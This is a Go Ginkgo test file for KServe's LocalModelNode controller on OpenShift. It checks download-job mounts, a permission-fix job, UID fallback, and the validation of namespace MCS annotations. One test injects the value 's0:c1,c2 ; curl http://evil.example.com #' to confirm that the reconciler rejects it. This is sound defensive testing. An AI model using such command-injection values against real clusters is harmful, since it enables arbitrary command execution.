//go:build distro

/*
Copyright 2024 The KServe Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package localmodelnode

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"time"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"
	batchv1 "k8s.io/api/batch/v1"
	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/resource"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/utils/ptr"
	"sigs.k8s.io/controller-runtime/pkg/client"

	"github.com/kserve/kserve/pkg/apis/serving/v1alpha1"
	"github.com/kserve/kserve/pkg/constants"
)

var _ = Describe("LocalModelNode OCP platform hooks", func() {
	const (
		timeout             = time.Second * 10
		interval            = time.Millisecond * 250
		modelCacheNamespace = "kserve-localmodel-jobs"
		sourceModelUri      = "s3://mybucket/mymodel"
	)
	var (
		modelName = "iris"
		configs   = map[string]string{
			"localModel": fmt.Sprintf(`{
				"jobNamespace": "%s",
				"defaultJobImage": "kserve/storage-initializer:latest",
				"fsGroup": 1000
			}`, modelCacheNamespace),
			"storageInitializer": `{
				"image": "kserve/storage-initializer:latest",
				"cpuRequest": "100m",
				"cpuLimit": "1",
				"memoryRequest": "200Mi",
				"memoryLimit": "1Gi"
			}`,
			"openshiftConfig": `{
				"modelcachePermissionFixImage": "quay.io/opendatahub/kserve-agent:latest"
			}`,
		}
		clusterStorageContainerSpec = v1alpha1.StorageContainerSpec{
			SupportedUriFormats: []v1alpha1.SupportedUriFormat{{Prefix: "s3://"}},
			Container: corev1.Container{
				Name:  "name",
				Image: "image",
				Args: []string{
					"srcURI",
					constants.DefaultModelLocalMountPath,
				},
				TerminationMessagePolicy: corev1.TerminationMessageFallbackToLogsOnError,
				VolumeMounts:             []corev1.VolumeMount{},
			},
		}
		localModelNodeGroupSpec = v1alpha1.LocalModelNodeGroupSpec{
			PersistentVolumeSpec: corev1.PersistentVolumeSpec{
				AccessModes:                   []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
				VolumeMode:                    ptr.To(corev1.PersistentVolumeFilesystem),
				Capacity:                      corev1.ResourceList{corev1.ResourceStorage: resource.MustParse("2Gi")},
				StorageClassName:              "standard",
				PersistentVolumeReclaimPolicy: corev1.PersistentVolumeReclaimDelete,
				PersistentVolumeSource: corev1.PersistentVolumeSource{
					HostPath: &corev1.HostPathVolumeSource{
						Path: "/models",
						Type: ptr.To(corev1.HostPathDirectory),
					},
				},
				NodeAffinity: &corev1.VolumeNodeAffinity{
					Required: &corev1.NodeSelector{
						NodeSelectorTerms: []corev1.NodeSelectorTerm{
							{
								MatchExpressions: []corev1.NodeSelectorRequirement{
									{
										Key:      "node.kubernetes.io/instance-type",
										Operator: corev1.NodeSelectorOpIn,
										Values:   []string{"gpu"},
									},
								},
							},
						},
					},
				},
			},
			PersistentVolumeClaimSpec: corev1.PersistentVolumeClaimSpec{
				AccessModes: []corev1.PersistentVolumeAccessMode{corev1.ReadWriteOnce},
				Resources:   corev1.VolumeResourceRequirements{Requests: corev1.ResourceList{corev1.ResourceStorage: resource.MustParse("2Gi")}},
			},
		}
	)

	Context("When using OCP platform hooks", func() {
		It("Should create download job with cleared SubPath and explicit Args path", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			fsMock.clear()
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-subpath"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-ocp-subpath"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{
							SourceModelUri: sourceModelUri,
							ModelName:      modelName,
						},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			labelSelector := map[string]string{
				"model": modelName,
				"node":  nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(labelSelector))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Download job should be created")

			job := &jobs.Items[0]
			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.VolumeMounts).To(HaveLen(1))
			Expect(container.VolumeMounts[0].SubPath).To(BeEmpty(),
				"Download job should not use SubPath, to allow FSGroup to apply permissions")
			Expect(container.Args).To(Equal([]string{sourceModelUri, filepath.Join(MountPath, "models", storageKey)}),
				"Download destination should include storageKey subdirectory")
			Expect(job.Spec.Template.Spec.ServiceAccountName).To(Equal("kserve-localmodelnode-agent"))
		})

		It("Should create permission fix job with single container when filesystem is not writable", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			// Simulate a root-owned volume that the agent can't write to, triggering the permission-fix job flow
			isModelRootWritable = func() bool { return false }

			// Patch the existing jobNamespace to add MCS annotation
			existingNs := &corev1.Namespace{}
			Expect(k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, existingNs)).Should(Succeed())
			patch := client.MergeFrom(existingNs.DeepCopy())
			if existingNs.Annotations == nil {
				existingNs.Annotations = map[string]string{}
			}
			existingNs.Annotations["openshift.io/sa.scc.mcs"] = "s0:c28,c27"
			Expect(k8sClient.Patch(ctx, existingNs, patch)).Should(Succeed())
			defer func() {
				ns := &corev1.Namespace{}
				_ = k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, ns)
				p := client.MergeFrom(ns.DeepCopy())
				delete(ns.Annotations, "openshift.io/sa.scc.mcs")
				_ = k8sClient.Patch(ctx, ns, p)
			}()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-perm-fix"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// Wait for permission fix job
			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")

			job := &jobs.Items[0]

			// Verify dedicated service account
			Expect(job.Spec.Template.Spec.ServiceAccountName).To(Equal("kserve-localmodel-permfix"))

			// Verify no init containers
			Expect(job.Spec.Template.Spec.InitContainers).To(BeEmpty())

			// Verify single main container with sh -c script
			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
			container := job.Spec.Template.Spec.Containers[0]
			Expect(container.Name).To(Equal("fix-permissions"))
			Expect(container.Command).To(Equal([]string{
				"sh", "-c",
				`set -eu; chown -R "$FIX_UID:$FIX_GID" "$TARGET" && chcon -R -t container_file_t -l "$MCS_LEVEL" "$TARGET"`,
			}))

			// Verify env vars
			envMap := map[string]string{}
			for _, e := range container.Env {
				envMap[e.Name] = e.Value
			}
			Expect(envMap).To(HaveKeyWithValue("FIX_UID", "1000"))
			Expect(envMap).To(HaveKeyWithValue("FIX_GID", "1000"))
			Expect(envMap).To(HaveKeyWithValue("TARGET", MountPath))
			Expect(envMap).To(HaveKeyWithValue("MCS_LEVEL", "s0:c28,c27"))

			// Verify resource limits
			Expect(container.Resources.Requests).NotTo(BeEmpty())
			Expect(container.Resources.Limits).NotTo(BeEmpty())

			// Verify blast radius controls
			Expect(job.Spec.ActiveDeadlineSeconds).To(Equal(ptr.To(int64(120))),
				"Job should have ActiveDeadlineSeconds to limit privileged pod lifetime")

			// Verify seccomp profile
			Expect(job.Spec.Template.Spec.SecurityContext.SeccompProfile).NotTo(BeNil(),
				"Pod should have a seccomp profile")
			Expect(job.Spec.Template.Spec.SecurityContext.SeccompProfile.Type).To(
				Equal(corev1.SeccompProfileTypeRuntimeDefault))

			// Reset writable for cleanup
			isModelRootWritable = func() bool { return true }
		})

		It("Should skip permission fix when filesystem is writable", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)
			fsMock.clear()
			// Simulate a volume that's already writable, so the reconciler skips the permission-fix job
			isModelRootWritable = func() bool { return true }
			fsHelper = fsMock
			storageKey := v1alpha1.GetStorageKey(sourceModelUri)
			fsMock.mockModel(&MockFileInfo{name: storageKey, isDir: true})

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			clusterStorageContainer := &v1alpha1.ClusterStorageContainer{
				ObjectMeta: metav1.ObjectMeta{Name: "test-ocp-writable"},
				Spec:       clusterStorageContainerSpec,
			}
			Expect(k8sClient.Create(ctx, clusterStorageContainer)).Should(Succeed())
			defer k8sClient.Delete(ctx, clusterStorageContainer)

			nodeGroup := &v1alpha1.LocalModelNodeGroup{
				ObjectMeta: metav1.ObjectMeta{Name: "gpu"},
				Spec:       localModelNodeGroupSpec,
			}
			Expect(k8sClient.Create(ctx, nodeGroup)).Should(Succeed())
			defer k8sClient.Delete(ctx, nodeGroup)

			nodeName = "worker-ocp-writable"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{
						{
							SourceModelUri: sourceModelUri,
							ModelName:      modelName,
						},
					},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// Wait for download job (proves reconcile ran)
			jobs := &batchv1.JobList{}
			labelSelector := map[string]string{
				"model": modelName,
				"node":  nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(labelSelector))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Download job should be created")

			// Assert no permission fix jobs exist
			fixJobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			err := k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
			Expect(err).ShouldNot(HaveOccurred())
			Expect(fixJobs.Items).To(BeEmpty(), "No permission fix jobs should exist when filesystem is writable")
		})

		It("Should fall back to process UID when FSGroup is not configured", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			isModelRootWritable = func() bool { return false }

			// Save and clear FSGroup
			savedFSGroup := FSGroup
			FSGroup = nil
			defer func() { FSGroup = savedFSGroup }()

			configsNoFSGroup := map[string]string{
				"localModel": fmt.Sprintf(`{
					"jobNamespace": "%s",
					"defaultJobImage": "kserve/storage-initializer:latest"
				}`, modelCacheNamespace),
				"storageInitializer": configs["storageInitializer"],
				"openshiftConfig": `{
					"modelcachePermissionFixImage": "quay.io/opendatahub/kserve-agent:latest"
				}`,
			}

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configsNoFSGroup,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-no-fsgroup"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			jobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			Eventually(func() bool {
				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return err == nil && len(jobs.Items) == 1
			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")

			job := &jobs.Items[0]
			container := job.Spec.Template.Spec.Containers[0]
			envMap := map[string]string{}
			for _, e := range container.Env {
				envMap[e.Name] = e.Value
			}
			Expect(envMap).To(HaveKeyWithValue("FIX_UID", strconv.Itoa(os.Getuid())),
				"FIX_UID should fall back to process UID when FSGroup is nil")
			Expect(envMap).To(HaveKeyWithValue("FIX_GID", strconv.Itoa(os.Getgid())),
				"FIX_GID should fall back to process GID when FSGroup is nil")

			isModelRootWritable = func() bool { return true }
		})

		It("Should reject invalid MCS level from namespace annotation", func() {
			ctx, cancel := context.WithCancel(context.Background())
			DeferCleanup(cancel)

			fsMock = &mockFileSystem{
				subDirs: []os.DirEntry{},
			}
			fsHelper = fsMock
			isModelRootWritable = func() bool { return false }

			// Patch namespace with an invalid MCS level (injection attempt)
			existingNs := &corev1.Namespace{}
			Expect(k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, existingNs)).Should(Succeed())
			patch := client.MergeFrom(existingNs.DeepCopy())
			if existingNs.Annotations == nil {
				existingNs.Annotations = map[string]string{}
			}
			existingNs.Annotations["openshift.io/sa.scc.mcs"] = "s0:c1,c2 ; curl http://evil.example.com #"
			Expect(k8sClient.Patch(ctx, existingNs, patch)).Should(Succeed())
			defer func() {
				ns := &corev1.Namespace{}
				_ = k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, ns)
				p := client.MergeFrom(ns.DeepCopy())
				delete(ns.Annotations, "openshift.io/sa.scc.mcs")
				_ = k8sClient.Patch(ctx, ns, p)
			}()

			configMap := &corev1.ConfigMap{
				ObjectMeta: metav1.ObjectMeta{
					Name:      constants.InferenceServiceConfigMapName,
					Namespace: constants.KServeNamespace,
				},
				Data: configs,
			}
			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
			defer k8sClient.Delete(ctx, configMap)

			nodeName = "worker-invalid-mcs"
			node := &corev1.Node{
				ObjectMeta: metav1.ObjectMeta{
					Name:   nodeName,
					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
				},
				Status: corev1.NodeStatus{
					Conditions: []corev1.NodeCondition{
						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
					},
				},
			}
			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
			defer k8sClient.Delete(ctx, node)

			localModelNode := &v1alpha1.LocalModelNode{
				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
				Spec: v1alpha1.LocalModelNodeSpec{
					LocalModels: []v1alpha1.LocalModelInfo{},
				},
			}
			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
			defer k8sClient.Delete(ctx, localModelNode)

			// The reconciler should error due to invalid MCS, no fix job should be created
			fixJobs := &batchv1.JobList{}
			fixLabels := map[string]string{
				"fix-permissions": "true",
				"node":            nodeName,
			}
			// Wait a bit and ensure NO permission fix job is created
			Consistently(func() int {
				_ = k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
				return len(fixJobs.Items)
			}, time.Second*3, interval).Should(Equal(0),
				"No permission fix job should be created with invalid MCS level")

			isModelRootWritable = func() bool { return true }
		})
	})
})
